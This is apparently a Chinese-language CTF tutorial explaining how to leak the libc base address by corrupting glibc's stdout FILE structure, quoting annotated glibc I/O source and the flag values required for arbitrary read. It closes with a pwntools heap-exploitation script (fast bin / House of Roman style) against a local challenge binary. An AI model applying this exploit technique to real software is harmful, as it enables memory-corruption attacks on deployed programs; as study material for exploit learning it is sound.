# stdout泄露libc地址

使用这个方法来泄露libc我们就要明白几个函数的原理和用法

## _IO_new_file_xsputn

其中第一个就是__IO_new_file_xsputn_这里我们就可以明白一些东西了

当我们的缓冲区不为0时那么我们的数据优先会放到base区中去是的他不能被leak出来

```c
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  const char *s = (const char *) data;
  _IO_size_t to_do = n;
  int must_flush = 0;
  _IO_size_t count = 0;

  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */

  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
      //这个位置就是检查end和ptr之间是否有空间空余
      count = f->_IO_buf_end - f->_IO_write_ptr;
      
      if (count >= n)
	{
	  const char *p;
	  for (p = s + n; p > s; )
	    {
	      if (*--p == '\n')
		{
		  count = p - s + 1;
		  must_flush = 1;
		  break;
		}
	    }
	}
    }
  else if (f->_IO_write_end > f->_IO_write_ptr)
      //这里也是一样
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */

  /* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
	count = to_do;
```

## _IO_new_file_overflow

`_IO_new_file_overflow` 是 glibc 中的一个函数，主要用于处理文件输出缓冲区相关的操作。以下是它的主要作用：

1. **刷新输出缓冲区**

当输出缓冲区已满或需要强制刷新时，`_IO_new_file_overflow` 会被调用来将缓冲区中的数据写入到文件中。例如，在 `fwrite` 函数中，如果输出缓冲区满了，就会调用 `_IO_new_file_overflow` 来刷新缓冲区。

2. **建立输出缓冲区**

如果输出缓冲区尚未建立，`_IO_new_file_overflow` 也会负责初始化输出缓冲区。它会通过调用 `_IO_file_doallocate` 函数来分配缓冲区。

3. **与文件操作相关**

`_IO_new_file_overflow` 是 `FILE` 结构体的 vtable 中的一个函数指针，与文件的读写操作密切相关。它在文件输出过程中起到关键作用，确保数据能够正确地从缓冲区写入到文件中。

4. **在特定场景下的行为**

- **在 `fwrite` 中**：当 `fwrite` 函数需要写入的数据量超过了当前输出缓冲区的剩余空间时，会调用 `_IO_new_file_overflow` 来处理剩余的数据。
- **在 `puts` 中**：`puts` 函数在输出数据时，如果需要刷新缓冲区，也会调用 `_IO_new_file_overflow`。

因此这个函数也是需要绕过的

```c
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
    //这个位置出现了一个flags不能包含IO—no-writes的 并且这个值为0x8
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
    //为了后面的不必要的麻烦这里我们应该包含_IO_CURRENTLY_PUTTING的值为0x0800
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_IO_write_base == NULL)
	{
	  _IO_doallocbuf (f);
	  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	}
      /* Otherwise must be currently reading.
	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
	 logically slide the buffer forwards one block (by setting the
	 read pointers to all point at the beginning of the block).  This
	 makes room for subsequent output.
	 Otherwise, set the read pointers to _IO_read_end (leaving that
	 alone, so it can continue to correspond to the external position). */
      if (__glibc_unlikely (_IO_in_backup (f)))
	{
	  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
	  _IO_free_backup_area (f);
	  f->_IO_read_base -= MIN (nbackup,
				   f->_IO_read_base - f->_IO_buf_base);
	  f->_IO_read_ptr = f->_IO_read_base;
	}

      if (f->_IO_read_ptr == f->_IO_buf_end)
	f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
	f->_IO_write_end = f->_IO_write_ptr;
    }
   //为了调用 _IO_do_write 输出缓冲区内容，令 _IO_write_base = read_start ，_IO_write_ptr = read_end
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
  if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return EOF;
  *f->_IO_write_ptr++ = ch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
    if (_IO_do_write (f, f->_IO_write_base,
		      f->_IO_write_ptr - f->_IO_write_base) == EOF)
      return EOF;
  return (unsigned char) ch;
}
libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
```

## new_do_write  

构造 _flags 包含 _IO_IS_APPENDING 或者 _IO_read_end 等于 _IO_write_base 就可以直接执行到 _IO_SYSWRITE 。其中 _IO_IS_APPENDING 的值为 0x1000   

```c
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      _IO_off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
```

进入到这里我们可以输出数据了

将上述条件综合描述为：

- 设置 _flag &~ _IO_NO_WRITES 即 _flag &~ 0x8
- 设置 _flag & _IO_CURRENTLY_PUTTING 即 _flag | 0x800设置 _fileno 为1
- 设置 _IO_write_base 指向想要泄露的地方； _IO_write_ptr 指向泄露结束的地址。
- 设置 _IO_read_end 等于 _IO_write_base 或设置 _flag & _IO_IS_APPENDING 即 _flag | 0x1000。
- 设置 _IO_write_end 等于 _IO_write_ptr （非必须）。

满足上述五个条件，可实现任意读。

对于没有输出功能的堆题，要想泄露 libc 基址就需要劫持 _IO_2_1_stdout_ 结构体。可以利用 fast bin attack 在 _IO_2_1_stdout_-0x43 处申请 fast bin。

```py
add(0x60, '\x00' * 0x33 + p32(0xfbad1880) + ";sh;" + p64(0) * 3 + p8(0x88))
# 5 write_base -> _IO_2_1_stdin_
```

这个具体的方法就是可以使用homes of ramon进行一个攻击

```python
from pwn import *
from xdg.Mime import inode_fifo

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
context.timeout = 1
p = process([elf.path])

def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


add_chunk(0,0x68)
add_chunk(1,0x98)
add_chunk(2,0x68)

delete_chunk(1)
add_chunk(3,0x28)
add_chunk(1,0x68)
edit_chunk(1,p16(0xc5dd))
#
delete_chunk(2)
delete_chunk(0)
delete_chunk(2)

add_chunk(2,0x68)
edit_chunk(2,p8(0xa0))

add_chunk(4,0x68)
add_chunk(4,0x68)
add_chunk(4,0x68)
add_chunk(4,0x68)


gdb.attach(p,'b *$rebase(0x13f0)\nc')
pause()
edit_chunk(4,b'\x00' * 0x33 + p32(0xfbad1880) + b";sh;" + p64(0) * 3 + p8(0x88))
gdb.attach(p)

libc.address= u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-libc.sym['_IO_2_1_stdin_']
info("libc.address:"+hex(libc.address))

p.interactive()
```

